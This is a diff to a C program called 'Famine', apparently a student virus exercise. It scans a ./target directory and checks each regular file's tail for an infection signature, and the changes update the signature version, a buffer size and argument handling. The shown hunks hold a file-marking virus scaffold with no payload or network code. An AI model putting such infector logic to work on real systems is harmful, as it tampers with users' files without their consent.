@@ -10,7 +10,7 @@
 #define _TARGET "./target"
 
 void famine(struct dirent *d, char *path){
-	char signature[] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0Famine 1.1 by mbrement and mgama";
+	char signature[] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0Famine 1.2 by mbrement and mgama";
 	if (d->d_type != DT_REG)
 		return ;
 	char name[sizeof(signature) + 256];
@@ -30,7 +30,7 @@ void famine(struct dirent *d, char *path){
 	{
 		size_t pos = lseek(fd, 0, SEEK_END);
 		lseek(fd, pos - sizeof(signature), SEEK_SET);
-		char buf2[sizeof(signature) + 257];
+		char buf2[sizeof(signature)];
 		int n = read(fd, buf2, sizeof(signature));
 		if (n <= 0)
 			return ;
@@ -60,14 +60,21 @@ int main(int argc, char **argv){
 		DIR *dir;
 		dir = opendir(_TARGET);
 		if (dir && argc == 1)
+		{
 			for (struct dirent *d = readdir(dir); d != NULL; d = readdir(dir))
 				famine(d, _TARGET);
+		}
 		else
+		for (int i = 1; i < argc; i++)
+		{
 			for (struct dirent *d = readdir(dir); d != NULL; d = readdir(dir))
 			{
-				if (strcmp(d->d_name, argv[1]) == 0)
+				if (strcmp(d->d_name, argv[i]) == 0)
 					famine(d, _TARGET);
 			}
-		closedir(dir);
+			closedir(dir);
+			dir = opendir(_TARGET);
+		}
+	closedir(dir);
 	return 0;
 }
